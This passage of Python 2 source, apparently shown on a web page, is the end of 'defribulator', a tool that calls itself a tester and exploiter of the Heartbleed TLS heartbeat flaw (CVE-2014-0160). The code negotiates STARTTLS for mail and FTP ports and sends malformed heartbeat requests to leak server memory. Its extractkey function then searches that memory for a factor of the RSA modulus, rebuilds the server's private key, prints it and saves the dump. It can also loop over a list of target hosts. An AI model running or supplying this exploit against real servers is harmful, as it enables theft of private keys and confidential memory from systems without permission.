smtp/pop3/imap ports are used<br />            if (opts.starttls) or (port in {25, 587, 110, 143, 21}):<br />                <br />                stls = False<br />                atls = False<br />                <br />                # check if smtp supports starttls/stls<br />                if port in {25, 587}:<br />                    print 'SMTP Port... Checking for STARTTLS Capability...'<br />                    check = s.recv(1024)<br />                    s.send("EHLO someone.org\n")<br />                    sys.stdout.flush()<br />                    check += s.recv(1024)<br />                    if opts.verbose:<br />                        print check<br />                                        <br />                    if "STARTTLS" in check:<br />                        opts.starttls = True<br />                        print "STARTTLS command found"<br />                    elif "STLS" in check:<br />                        opts.starttls = True<br />                        stls = True<br />                        print "STLS command found"<br />                    else:<br />                        print "STARTTLS command NOT found!"<br />                        print '##################################################################'<br />                        return<br />                <br />                # check if pop3/imap supports starttls/stls                            <br />                elif port in {110, 143}:<br />                    print 'POP3/IMAP4 Port... Checking for STARTTLS Capability...'<br />                    check = s.recv(1024)<br />                    if port == 110:<br />                        s.send("CAPA\n")<br />                    if port == 143:<br />                        s.send("CAPABILITY\n")<br />                    sys.stdout.flush()<br />                    check += s.recv(1024)<br />                    if opts.verbose:<br />                        print check<br />                                           <br />                    if "STARTTLS" in check:<br />                        opts.starttls = True<br />                        print "STARTTLS command found"<br />                    elif "STLS" in check:<br />                        opts.starttls = True<br />                        stls = True<br />                        print "STLS command found"<br />                    else:<br />                        print "STARTTLS command NOT found!"<br />                        print '##################################################################'<br />                        return<br />                        <br />                # check if ftp supports auth tls/starttls                          <br />                elif port in {21}:<br />                    print 'FTP Port... Checking for AUTH TLS Capability...'<br />                    check = s.recv(1024)<br />                    s.send("FEAT\n")<br />                    sys.stdout.flush()<br />                    check += s.recv(1024)<br />                    if opts.verbose:<br />                        print check<br />                        <br />                    if "STARTTLS" in check:<br />                        opts.starttls = True<br />                        print "STARTTLS command found"<br />                    elif "AUTH TLS" in check:<br />                        opts.starttls = True<br />                        atls = True<br />                        print "AUTH TLS command found"<br />                    else:<br />                        print "STARTTLS command NOT found!"<br />                        print '##################################################################'<br />                        return<br />                                        <br />                # send appropriate tls command if supported                        <br />                if opts.starttls:       <br />                    sys.stdout.flush()<br />                    if stls:<br />                        print 'Sending STLS Command...'<br />                        s.send("STLS\n")<br />                    elif atls:<br />                        print 'Sending AUTH TLS Command...'<br />                        s.send("AUTH TLS\n")<br />                    else:<br />                        print 'Sending STARTTLS Command...'<br />                        s.send("STARTTLS\n")<br />                    if opts.verbose:<br />                        print 'Waiting for reply...'<br />                    sys.stdout.flush()<br />                    rcv_tls_record(s)<br /><br />            supported = False<br />            for num,tlsver in tls_versions.items():<br />                <br />                if firstrun:<br />                    print 'Sending Client Hello for {}'.format(tlsver)<br />                s.send(hex2bin(build_client_hello(num)))<br />                <br />                if opts.verbose:<br />                    print 'Waiting for Server Hello...'<br />                <br />                while True:<br />                    typ,ver,message = rcv_tls_record(s)<br />                    if not typ:<br />                        if opts.verbose:<br />                            print 'Server closed connection without sending ServerHello for {}'.format(tlsver)<br />                        s.close()<br />                        s = conn(targ, port)<br />                        break<br />                    if typ == 22 and ord(message[0]) == 0x0E:<br />                        if firstrun:<br />                            print 'Received Server Hello for {}'.format(tlsver)<br />                        supported = True<br />                        break<br />                if supported: break<br /><br />            if not supported:<br />                print '\nError! No TLS versions supported!'<br />                print '##################################################################'<br />                return<br /><br />            if opts.verbose:<br />                print '\nSending heartbeat request...'<br />            sys.stdout.flush()<br />            <br />            keyfound = False<br />            if opts.extractkey:<br />            	res = hit_hb(s, targ, firstrun, supported)<br />            	if res == '':<br />            	    continue<br />            	keyfound = extractkey(targ, res, modulus)<br />            else:<br />	            res += hit_hb(s, targ, firstrun, supported)<br />            s.close()<br />            if keyfound:<br />                sys.exit(0)<br />            else:<br />                sys.stdout.write('\rPlease wait... connection attempt ' + str(x+1) + ' of ' + str(opts.num))<br />                sys.stdout.flush()<br />        <br />        print '\n##################################################################'<br />        print       <br />        return res<br />    <br />    except Exception as e:<br />       print "Error! " + str(e)<br />       print '##################################################################'<br />       print               <br /><br />def extractkey(host, chunk, modulus):<br />	<br />    #print "\nChecking for private key...\n"<br />    n = int (modulus, 16)<br />    keysize = n.bit_length() / 16<br /><br />    for offset in xrange (0, len (chunk) - keysize):<br />        p = long (''.join (["%02x" % ord (chunk[x]) for x in xrange (offset + keysize - 1, offset - 1, -1)]).strip(), 16)<br />        if gmpy.is_prime (p) and p != n and n % p == 0:<br />            if opts.verbose:<br />                print '\n\nFound prime: ' + str(p)<br />            e = 65537<br />            q = n / p<br />            phi = (p - 1) * (q - 1)<br />            d = gmpy.invert (e, phi)<br />            dp = d % (p - 1)<br />            dq = d % (q - 1)<br />            qinv = gmpy.invert (q, p)<br />            seq = Sequence()<br />            for x in [0, n, e, d, p, q, dp, dq, qinv]:<br />                seq.setComponentByPosition (len (seq), Integer (x))<br />            print "\n\n-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n\n" % base64.encodestring(encoder.encode (seq))<br />            privkeydump = open("hb-certs/privkey_" + host + ".dmp", "a")<br />            privkeydump.write(chunk)<br />            return True<br />        else:<br />            return False<br /><br />def main():<br /><br />    print "\ndefribulator v1.16"<br />    print "A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)"<br />    allresults = ''<br />                    <br />    # if a file is specified, loop through file<br />    if opts.filein:<br />        fileIN = open(opts.filein, "r")<br />        <br />        for line in fileIN:<br />            targetinfo = line.strip().split(":")<br />            if len(targetinfo) &gt; 1:<br />                allresults = bleed(targetinfo[0], int(targetinfo[1]))<br />            else:<br />                allresults = bleed(targetinfo[0], opts.port)<br />            <br />            if allresults and (not opts.donotdisplay):<br />                print '%s' % (allresults)<br /><br />        fileIN.close()<br /><br />    else:<br />        if len(args) &lt; 1:<br />            options.print_help()<br />            return<br />        allresults = bleed(args[0], opts.port)<br />        if allresults and (not opts.donotdisplay):<br />            print '%s' % (allresults)<br />    <br />    print<br />    <br />    if opts.rawoutfile:<br />        rawfileOUT.close()<br />    <br />    if opts.asciioutfile:<br />        asciifileOUT.close()<br />            <br />if __name__ == '__main__':<br />    main()<br /></div></div>
</body></html>